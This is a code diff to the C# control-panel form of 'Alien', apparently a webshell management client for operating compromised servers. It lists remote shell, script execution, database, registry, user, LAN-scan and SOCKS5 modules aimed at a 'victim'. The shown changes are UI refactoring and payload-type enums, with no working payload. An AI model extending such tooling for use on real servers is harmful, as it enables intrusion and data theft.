@@ -26,36 +26,37 @@ using System.Globalization;
 using System.Reflection.Metadata;
 using System.Data.Entity.Core.Metadata.Edm;
 using System.Text.Json.Nodes;
+
 using static Alien.clsThemeManager;
 
 namespace Alien
 {
     public partial class frmControlPanel : BaseForm
     {
-        private TabPage draggedTab = null;
+        private TabPage? draggedTab = null;
 
         public clsWeb m_web { get; init; }
         public clsVictim m_victim { get { return m_web.m_victim; } }
 
-        private bool m_isReading = false; // Virtual Shell
+        private bool m_isReading = false;                   // Virtual Shell
 
-        public clsfnInfoSpyder m_infoSpyder { get; init; }
-        public clsfnFileMgr m_fileMgr { get; init; }
-        public clsfnShell m_rShell { get; set; }
-        public clsfnDb m_dbMgr { get; init; }
-        public clsfnRunScript m_runScript { get; init; }
-        public clsfnLAN m_lan { get; init; }
-        public clsfnWinReg m_winReg { get; init; }
-        public clsfnWinUser m_winUser { get; init; }
-        public clsfnPlugin m_plugin { get; init; }
-        public clsfnSocks5 m_socks5 { get; init; }
+        public clsfnInfoSpyder m_infoSpyder { get; init; }  // Infospyder
+        public clsfnFileMgr m_fileMgr { get; init; }        // File Manager
+        public clsfnShell m_rShell { get; set; }            // Remote Shell
+        public clsfnDb m_dbMgr { get; init; }               // Database Manager
+        public clsfnRunScript m_runScript { get; init; }    // Run Arbitrary Script
+        public clsfnLAN m_lan { get; init; }                // LAN Tools
+        public clsfnWinReg m_winReg { get; init; }          // Windows Registry
+        public clsfnWinUser m_winUser { get; init; }        // Windows Users
+        public clsfnPlugin m_plugin { get; init; }          // Plugins
+        public clsfnSocks5 m_socks5 { get; init; }          // SOCKS5
 
         private WebBrowser m_ctrlInfoBrowser = new WebBrowser();
         private WebBrowser m_ctrlEvalBrowser = new WebBrowser();
         private TextEditorControlEx m_ctrlEvalEditor = new TextEditorControlEx();
         private TextEditorControlEx m_ctrlPostEditor = new TextEditorControlEx();
 
-        private Dictionary<enLanguage, Func<string, string>> m_dicEvalScript = new Dictionary<enLanguage, Func<string, string>>()
+        private Dictionary<enLanguage, Func<enPayloadType, string>> m_dicEvalScript = new Dictionary<enLanguage, Func<enPayloadType, string>>()
         {
             {
                 enLanguage.PHP,
@@ -75,9 +76,9 @@ namespace Alien
                 enLanguage.ASPX,
                 (method) =>
                 {
-                    if (method == "JScript")
+                    if (method == enPayloadType.OneShell)
                         return "Response.Write(\"JScript ASPX\");";
-                    else if (method == "NebulaPulsar")
+                    else if (method == enPayloadType.DarkMatter)
                         return "int a = 1;\r\nint b = 2;\r\nreturn a + b;";
                     else
                         return string.Empty;
@@ -87,9 +88,9 @@ namespace Alien
                 enLanguage.ASHX,
                 (method) =>
                 {
-                    if (method == "JScript")
+                    if (method == enPayloadType.OneShell)
                         return "Response.Write(\"JScript ASPX\");";
-                    else if (method == "NebulaPulsar")
+                    else if (method == enPayloadType.DarkMatter)
                         return "int a = 1;\r\nint b = 2;\r\nreturn a + b;";
                     else
                         return string.Empty;
@@ -99,9 +100,9 @@ namespace Alien
                 enLanguage.ASMX,
                 (method) =>
                 {
-                    if (method == "JScript")
+                    if (method == enPayloadType.OneShell)
                         return "Response.Write(\"JScript ASPX\");";
-                    else if (method == "NebulaPulsar")
+                    else if (method == enPayloadType.DarkMatter)
                         return "int a = 1;\r\nint b = 2;\r\nreturn a + b;";
                     else
                         return string.Empty;
@@ -111,9 +112,21 @@ namespace Alien
                 enLanguage.JSP,
                 (method) =>
                 {
-                    if (method == "Nashorn")
+                    if (method == enPayloadType.OneShell)
                         return "response.getWriter().println(\"Hello here is the test\");";
-                    else if (method == "NebulaPulsar")
+                    else if (method == enPayloadType.DarkMatter)
+                        return "int a = 1;\r\nint b = 1;\r\nreturn a + b;";
+                    else
+                        return string.Empty;
+                }
+            },
+            {
+                enLanguage.JSPX,
+                (method) =>
+                {
+                    if (method == enPayloadType.OneShell)
+                        return "response.getWriter().println(\"Hello here is the test\");";
+                    else if (method == enPayloadType.DarkMatter)
                         return "int a = 1;\r\nint b = 1;\r\nreturn a + b;";
                     else
                         return string.Empty;
@@ -123,7 +136,7 @@ namespace Alien
                 enLanguage.CFM,
                 (method) =>
                 {
-                    if (method == "NebulaPulsar")
+                    if (method == enPayloadType.DarkMatter)
                         return "int a = 1;\r\nint b = 1;\r\nreturn a + b;";
                     else
                         return string.Empty;
@@ -133,7 +146,7 @@ namespace Alien
                 enLanguage.Perl,
                 (method) =>
                 {
-                    if (method == "CGI")
+                    if (method == enPayloadType.OneShell)
                         return "print(\"Hello here is the test\")";
                     else
                         return string.Empty;
@@ -143,7 +156,7 @@ namespace Alien
                 enLanguage.Ruby,
                 (method) =>
                 {
-                    if (method == "CGI")
+                    if (method == enPayloadType.OneShell)
                         return "puts \"Hello here is the test\"";
                     else
                         return string.Empty;
@@ -185,21 +198,32 @@ namespace Alien
             public clsfnDb m_dbMgr { get; init; }
             public clsfnDb.stDbConfig m_config { get; init; }
             public TreeNode m_nodeRoot { get; init; }
-            public TabPage page { get; init; }
+            public TabPage? page { get; init; }
 
-            public ToolStrip toolStrip { get; init; }
-            public ListView listView { get; init; }
-            public TextBox textBox { get; init; }
+            public ToolStrip? toolStrip { get; init; }
+            public ListView? listView { get; init; }
+            public TextBox? textBox { get; init; }
 
             public List<string> m_lsLastTable = new List<string>();
 
-            private ImageList dbListImageList { get; init; }
+            private ImageList? dbListImageList { get; init; }
 
             public clsDbTablePageControls(clsfnDb dbMgr, clsfnDb.stDbConfig config, TreeNode nodeRoot, TabPage page, ImageList imageList, ContextMenuStrip menuTable)
             {
                 m_dbMgr = dbMgr;
                 m_config = config;
                 m_nodeRoot = nodeRoot;
+
+                if (page.Controls.Count > 0)
+                {
+                    listView = page.Controls.OfType<ListView>().FirstOrDefault();
+                    toolStrip = page.Controls.OfType<ToolStrip>().FirstOrDefault();
+                    textBox = page.Controls.OfType<TextBox>().FirstOrDefault();
+
+                    dbListImageList = listView.LargeImageList;
+
+                    return;
+                }
 
                 dbListImageList = new ImageList();
                 dbListImageList.ImageSize = new Size(60, 60);
@@ -273,8 +297,6 @@ namespace Alien
                         if (lsTables.Count == 0)
                         {
                             MessageBox.Show($"Cannot find any table in \"{szDbName}\"", "It is empty!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-
-                            return;
                         }
 
                         lv.Items.Clear();
@@ -321,9 +343,9 @@ namespace Alien
             private clsfnDb.stDbConfig m_cfg { get; init; }
             private clsfnDb m_dbMgr { get; init; }
 
-            public TextBox textBox { get; init; }
-            public DataGridView dataGridView { get; init; }
-            public ToolStrip toolStrip { get; init; }
+            public TextBox? textBox { get; init; }
+            public DataGridView? dataGridView { get; init; }
+            public ToolStrip? toolStrip { get; init; }
 
             private TabPage? m_page;
             private DataTable? m_dt = null;
@@ -466,9 +488,9 @@ namespace Alien
             }
 
             /// <summary>
-            /// 
+            /// Save SQL dta as *.csv file
             /// </summary>
-            /// <param name="szFilePath"></param>
+            /// <param name="szFilePath">Destination file path</param>
             private void fnExportToCSV(string szFilePath)
             {
                 StringBuilder sb = new StringBuilder();
@@ -496,9 +518,9 @@ namespace Alien
             }
 
             /// <summary>
-            /// 
+            /// Save SQL data as *.sql file
             /// </summary>
-            /// <param name="szFilePath"></param>
+            /// <param name="szFilePath">Destination file path</param>
             private void fnExportToSQL(string szFilePath)
             {
                 StringBuilder sb = new StringBuilder();
@@ -529,7 +551,7 @@ namespace Alien
             }
 
             /// <summary>
-            /// 
+            /// Save datatable modification to remote server.
             /// </summary>
             /// <returns></returns>
             private async Task<bool> fnbDbSaveRemoteChanges()
@@ -792,6 +814,8 @@ namespace Alien
                 });
                 toolStrip.Font = page.Font;
 
+                ThemeManager.ApplyRange(page.Controls);
+
                 btnExec.Click += async (s, e) =>
                 {
                     string szSQL = textEditorControl.Text;
@@ -881,6 +905,8 @@ namespace Alien
                 page.Controls.Add(dgvSchema);
                 page.Controls.Add(toolStrip);
                 page.Controls.Add(txtTableName);
+
+                ThemeManager.ApplyRange(page.Controls);
 
                 dgvSchema.BringToFront();
             }
@@ -2371,6 +2397,8 @@ namespace Alien
             toolStripStatusLabel7.Text = string.Empty;
             toolStripStatusLabel8.Text = "Loading...";
 
+            toolStripLabel2.Text = string.Empty;
+
             textBox8.Text = m_victim.ShellURL;
 
             treeView3.ImageList = fileImageList;
@@ -2655,7 +2683,7 @@ namespace Alien
 
             if (m_dicEvalScript.ContainsKey(m_victim.ShellLanguage))
             {
-                m_ctrlEvalEditor.Text = m_dicEvalScript[m_victim.ShellLanguage](m_victim.ShellMethod);
+                m_ctrlEvalEditor.Text = m_dicEvalScript[m_victim.ShellLanguage](m_victim.ShellPayloadType);
                 m_ctrlEvalEditor.Refresh();
             }
 
@@ -3275,8 +3303,6 @@ namespace Alien
                 if (lsTables.Count == 0)
                 {
                     MessageBox.Show($"Cannot find any table in \"{szDbName}\"", "It is empty!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-
-                    return;
                 }
 
                 fnDbShowTablePage(node, szHost, szDbName, lsTables);
@@ -4478,9 +4504,9 @@ namespace Alien
                         else
                         {
                             if (m_lan.m_dicHost[ip].Contains(135) || m_lan.m_dicHost[ip].Contains(139) || m_lan.m_dicHost[ip].Contains(445))
-                                item.ImageKey = "Windows";
+                                Invoke(() => item.ImageKey = "Windows");
                             else if (m_lan.m_dicHost[ip].Contains(22))
-                                item.ImageKey = "Linux";
+                                Invoke(() => item.ImageKey = "Linux");
                         }
 
                         Invoke(() =>
@@ -4642,6 +4668,9 @@ namespace Alien
         {
             treeView1.Nodes.Clear();
 
+            string szHtmlPath = Path.Combine(m_plugin.m_szPluginsDir, "index.html");
+            webViewPlugin.CoreWebView2.Navigate(szHtmlPath);
+
             string szPluginsBaseDir = Path.Combine(Application.StartupPath, "Plugins");
             int nCount = await fnLoadAllPlugins(szPluginsBaseDir, treeView1.Nodes);
 
@@ -4654,10 +4683,23 @@ namespace Alien
         {
             if (e.KeyCode == Keys.Enter)
             {
-                if (string.IsNullOrEmpty(textBox13.Text))
+                if (string.IsNullOrEmpty(textBox12.Text))
                 {
                     string szHtmlPath = Path.Combine(m_plugin.m_szPluginsDir, "index.html");
                     webViewPlugin.CoreWebView2.Navigate(szHtmlPath);
+                }
+                else
+                {
+                    TreeNode node = fnFindNodeWithFullPath(treeView1.Nodes, textBox12.Text);
+                    if (node == null)
+                    {
+                        string szHtmlPath = Path.Combine(m_plugin.m_szPluginsDir, "404.html");
+                        webViewPlugin.CoreWebView2.Navigate(szHtmlPath);
+
+                        return;
+                    }
+
+                    treeView1.SelectedNode = node;
                 }
             }
         }
@@ -4669,7 +4711,7 @@ namespace Alien
                 treeView1.Nodes.Clear();
 
                 string szPluginsBaseDir = Path.Combine(Application.StartupPath, "Plugins");
-                int nCount = await fnLoadAllPlugins(szPluginsBaseDir, treeView1.Nodes, textBox12.Text);
+                int nCount = await fnLoadAllPlugins(szPluginsBaseDir, treeView1.Nodes, textBox13.Text);
 
                 treeView1.ExpandAll();
 
